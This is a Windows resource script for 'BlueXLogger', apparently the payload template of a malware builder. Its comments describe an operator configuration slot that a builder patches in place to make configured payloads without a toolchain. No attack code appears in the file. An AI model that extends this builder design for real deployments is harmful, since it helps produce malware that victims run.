/*============================================================================
 * BlueXLogger - res/payload.rc
 * Resources compiled into BlueXLogger.exe (the payload / builder template).
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Invoke rc.exe from the PROJECT ROOT so that the data-file paths below
 * resolve, and pass /Iinclude /Ires for the #include directives:
 *
 *   rc /nologo /Iinclude /Ires /fo build\obj\payload.res res\payload.rc
 *==========================================================================*/
#include <windows.h>
#include "bxl_branding.h"
#include "bxl_resid.h"

/*--------------------------------------------------------------------------
 * Application icon. Generated at build time by tools/gen_ico.c so that the
 * repository never carries a binary blob.
 *------------------------------------------------------------------------*/
BXL_RES_ICON ICON "res/bluexlogger.ico"

/*--------------------------------------------------------------------------
 * The operator configuration slot.
 *
 * This is the heart of the embedded-configuration design. The slot is a
 * fixed 8192-byte RCDATA blob that ships holding the placeholder magic
 * "BXCFG0" (see tools/gen_slot.c). BlueXBuilder copies the whole EXE and
 * overwrites exactly this many bytes in place, so the resource directory,
 * the section table and every RVA stay byte-identical and no toolchain is
 * needed on the operator's machine.
 *
 * NEVER change the size of this slot. BXL_CFG_SLOT_SIZE in bxl_config.h,
 * SLOT_SIZE in tools/gen_slot.c and this file must always agree.
 *------------------------------------------------------------------------*/
BXL_RES_CFG_NAME RCDATA "res/cfg_slot.bin"

/*--------------------------------------------------------------------------
 * Watermark / about text. Present so that the attribution survives even when
 * the binary is opened with a resource viewer rather than run.
 *------------------------------------------------------------------------*/
BXL_RES_ABOUT_NAME RCDATA "res/about.txt"

/*--------------------------------------------------------------------------
 * Application manifest: as-invoker, PerMonitorV2 DPI aware. The DPI setting
 * is functional - see res/payload.manifest.
 *------------------------------------------------------------------------*/
CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "res/payload.manifest"

/*--------------------------------------------------------------------------
 * Version information. The watermark is repeated in the Comments field so
 * that it appears in the Explorer property sheet.
 *------------------------------------------------------------------------*/
VS_VERSION_INFO VERSIONINFO
 FILEVERSION    BXL_VERSION_MAJOR,BXL_VERSION_MINOR,BXL_VERSION_PATCH,BXL_VERSION_BUILD
 PRODUCTVERSION BXL_VERSION_MAJOR,BXL_VERSION_MINOR,BXL_VERSION_PATCH,BXL_VERSION_BUILD
 FILEFLAGSMASK  0x3fL
#ifdef _DEBUG
 FILEFLAGS      0x1L
#else
 FILEFLAGS      0x0L
#endif
 FILEOS         0x40004L
 FILETYPE       0x1L
 FILESUBTYPE    0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      BXL_VENDOR
            VALUE "FileDescription",  BXL_DESCRIPTION
            VALUE "FileVersion",      BXL_VERSION_STR
            VALUE "InternalName",     BXL_PRODUCT_NAME
            VALUE "LegalCopyright",   BXL_COPYRIGHT
            VALUE "OriginalFilename", "BlueXLogger.exe"
            VALUE "ProductName",      BXL_PRODUCT_NAME
            VALUE "ProductVersion",   BXL_VERSION_STR
            VALUE "Comments",         BXL_WATERMARK
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
